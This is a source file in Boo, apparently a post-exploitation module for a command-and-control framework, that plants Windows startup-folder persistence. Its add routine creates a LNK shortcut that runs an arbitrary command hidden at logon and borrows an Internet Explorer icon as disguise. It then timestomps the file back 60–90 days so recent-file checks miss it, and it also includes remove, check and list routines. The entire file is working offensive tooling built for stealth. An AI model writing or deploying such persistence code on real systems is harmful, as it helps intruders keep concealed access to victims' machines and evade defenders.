/*
    This module is inspired from SharPersist (https://github.com/fireeye/SharPersist)
*/
import System
import System.IO
import System.Security.Cryptography
import System.Diagnostics


public static def SHA256CheckSum(filePath as string) as string:
    using stream = File.OpenRead(filePath):
        sha as SHA256Managed = SHA256Managed()
        hash as (byte) = sha.ComputeHash(stream)
        return BitConverter.ToString(hash).Replace("-", String.Empty)


public def initialize(command as string, commandArg as string, fileName as string, status as string):
    if status == "add":
        if (not command or not fileName):
            print "\r\n[-] ERROR: Must give both a command and a file name."
            return
        addPersistence(command, commandArg, fileName)

    elif status == "remove":
        if not fileName:
            print "\r\n[-] ERROR: Must give a file name."
            return
        removePersistence(fileName)

    elif status == "check":
        checkPersistence(command, fileName)

    elif status == "list":
        listPersistence()

    else:
        print "\r\n[-] ERROR: Invalid method given. Must give add, remove, check or list."
        return


public def addPersistence(command as string, commandArg as string, fileName as string):
    print "\r\n[*] INFO: Adding startup folder persistence"
    print "[*] INFO: Command: " + command
    print "[*] INFO: Command Args: " + commandArg
    print "[*] INFO: File Name: " + fileName

    // full lnk file path
    lnkPath as string = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

    // if a lnk file already exists by that name, inform user and then return
    if (File.Exists(lnkPath + fileName + ".lnk")):
        print "\r\n[-] ERROR: LNK file with that name already exists. Please specify a different name."
        return

    // create the lnk file
    m_type as Type = Type.GetTypeFromProgID("WScript.Shell")
    m_shell as object = Activator.CreateInstance(m_type)
    args as (object) = array(object, 1)
    args[0] = lnkPath + fileName + ".lnk"
    shortcut = m_type.InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, m_shell, args)
    shortcut.TargetPath = command
    shortcut.Arguments = commandArg
    shortcut.IconLocation = "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"
    shortcut.WindowStyle = 7 // hidden style
    shortcut.Save()

    // get current file attributes for the lnk file created
    creationTime as DateTime = File.GetCreationTime(lnkPath + fileName + ".lnk")
    lastAccessTime as DateTime = File.GetLastAccessTime(lnkPath + fileName + ".lnk")
    lastWriteTime as DateTime = File.GetLastWriteTime(lnkPath + fileName + ".lnk")

    // set file attributes back between 60 and 90 days to prevent from being seen in any recent file checks
    r as Random = Random()
    numDays as int = r.Next(60, 90)

    File.SetCreationTime(lnkPath + fileName + ".lnk", DateTime.Now.AddDays(numDays * -1))
    File.SetLastAccessTime(lnkPath + fileName + ".lnk", DateTime.Now.AddDays(numDays * -1))
    File.SetLastWriteTime(lnkPath + fileName + ".lnk", DateTime.Now.AddDays(numDays * -1))



    if (File.Exists(lnkPath + fileName + ".lnk")):
        print "\r\n[+] SUCCESS: Startup folder persistence created"
        print "[*] INFO: LNK File located at: " + lnkPath + fileName + ".lnk"
        print "[*] INFO: SHA256 Hash of LNK file: " + SHA256CheckSum(lnkPath + fileName + ".lnk")
    else:
        print "[-] ERROR: Startup folder persistence not created"
        return


public def removePersistence(fileName as string):
    print "\r\n[*] INFO: Removing startup folder persistence"
    print "[*] INFO: File Name: " + fileName

    lnkPath as string = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

    try:
        if (not System.IO.File.Exists(lnkPath + fileName + ".lnk")):
            print "\r\n[-] ERROR: Must provide LNK file that already exists to remove. Please check name again."
            return
    except ex as System.IO.FileNotFoundException:
        print "\r\n[-] ERROR: LNK file was not found. Please check path."
        return

    System.IO.File.Delete(lnkPath + fileName + ".lnk")

    if (not File.Exists(lnkPath + fileName + ".lnk")):
        print "\r\n[+] SUCCESS: Startup folder persistence removed"
    else:
        print "\r\n[-] ERROR: Startup folder persistence was not removed"


public def checkPersistence(command as string, filePath as string):
    lnkPath as string = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

    print "\r\n[*] INFO: Checking if that file already exists in: " + lnkPath

    // if a lnk file already exists by that name, inform user and then return
    if (File.Exists(lnkPath + filePath + ".lnk")):
        print "\r\n[-] ERROR: LNK file with that name already exists."

    else:
        print "\r\n[+] SUCCESS: LNK file with that name does NOT exist"

    print "\r\n[*] INFO: Checking for correct arguments given"

    if (not command or not filePath):
        print "\r\n[-] ERROR: Must give both a command and a file name."
        return

    print "[+] SUCCESS: Correct arguments given"


public def listPersistence():
    lnkPath as string = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

    print "\r\n[*] INFO: Listing all LNK files in startup folder persistence location."
    print "[*] INFO: Current LNK files in: " + lnkPath

    d as DirectoryInfo = DirectoryInfo(lnkPath) // get the directory where lnk file will be placed

    // iterate through all lnk files and display lnk file attributes
    try:
        m_type as Type = Type.GetTypeFromProgID("WScript.Shell")
        m_shell as object = Activator.CreateInstance(m_type)
        args as (object) = array(object, 1)
        for file in d.GetFiles("*.lnk"):
            args[0] = lnkPath + file
            shortcut = m_type.InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, m_shell, args)
            print "\r\n[*] INFO: LNK File Name: " + file.Name
            print "[*] INFO: LNK Description: " + shortcut.Description
            print "[*] INFO: LNK Target Path: " + shortcut.TargetPath
            print "[*] INFO: LNK Arguments: " + shortcut.Arguments
    except ex:
        print ex


public static def Main():
    command = "COMMAND"
    commandArg = "ARGUMENTS"
    fileName = `FILENAME`
    status = "STATUS"

    initialize(command, commandArg, fileName, status)
